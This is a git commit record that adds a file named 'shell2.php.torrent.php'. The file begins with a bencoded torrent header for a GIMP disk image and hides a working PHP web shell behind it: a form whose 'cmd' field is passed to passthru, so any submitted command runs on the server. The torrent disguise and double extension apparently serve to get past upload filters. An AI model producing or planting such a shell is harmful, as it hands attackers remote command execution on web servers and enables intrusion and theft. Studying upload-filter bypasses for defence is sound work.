6bf3664e96290a84fa05323ca94d7fa7397f7ee0
Nir Alfasi <alfasin@gmail.com>
2018-04-21 00:16:22 -0700

    Add files via upload

---
+++ shell2.php.torrent.php
@@ -0,0 +1,6 @@
+d8:announce29:udp://tracker.publicbt.com:8013:announce-listll29:udp://tracker.publicbt.com:80el35:udp://tracker.openbittorrent.com:80ee7:comment28:GIMP 2.8.14 Apple Disk Image10:created by13:mktorrent 1.013:creation datei1412191881e4:infod6:lengthi63616181e4:name15:gimp-2.8.14.dmg12:piece lengthi262144e6:pieces4860:
+<form action="" method="get">
+Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
+</form>
+Output:<br />
+<pre><?php passthru($_REQUEST['cmd'], $result); ?></pre>
